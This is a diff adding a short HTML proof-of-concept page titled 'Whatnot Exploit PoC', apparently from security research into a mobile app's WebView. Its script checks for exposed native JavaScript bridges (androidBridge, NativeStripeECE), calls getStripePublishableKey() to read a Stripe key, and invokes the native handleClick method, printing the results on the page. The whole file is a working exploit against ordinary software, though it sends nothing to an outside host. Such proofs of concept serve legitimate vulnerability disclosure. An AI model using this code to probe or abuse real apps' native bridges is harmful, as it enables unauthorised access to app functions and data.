@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Whatnot Exploit PoC</title>
+</head>
+<body>
+  <h1>WebView Exploit PoC</h1>
+
+  <script>
+    function log(msg) {
+      document.body.innerHTML += "<p>" + msg + "</p>";
+    }
+
+    log("Page loaded");
+
+    // Check bridge existence
+    log("androidBridge: " + typeof window.androidBridge);
+    log("NativeStripeECE: " + typeof window.NativeStripeECE);
+
+    // Try extracting Stripe key
+    try {
+      if (window.NativeStripeECE) {
+        let key = window.NativeStripeECE.getStripePublishableKey();
+        log("Stripe Key: " + key);
+      }
+    } catch (e) {
+      log("Stripe error: " + e.message);
+    }
+
+    // Try calling native method
+    try {
+      if (window.NativeStripeECE) {
+        window.NativeStripeECE.handleClick({ test: "poc" });
+        log("handleClick executed");
+      }
+    } catch (e) {
+      log("handleClick error: " + e.message);
+    }
+  </script>
+</body>
+</html>
